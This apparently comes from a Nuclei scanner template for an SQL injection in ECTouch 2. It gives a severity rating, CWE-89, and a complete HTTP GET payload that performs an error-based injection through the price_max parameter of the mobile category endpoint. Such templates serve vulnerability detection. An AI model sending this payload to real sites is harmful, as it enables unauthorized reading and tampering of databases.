# Nuclei Template: ECTouch 2 - SQL Injection
**Template ID:** etouch-v2-sqli
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**CWE:** CWE-89
**Source:** Nuclei Template (`etouch-v2-sqli.yaml`)

## Vulnerability Information & PoC

## Description
ECTouch 2 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/upload/mobile/index.php?c=category&a=asynclist&price_max=1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5({{num}}),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)''
```

## References
- https://github.com/mstxq17/CodeCheck/
- https://www.anquanke.com/post/id/168991
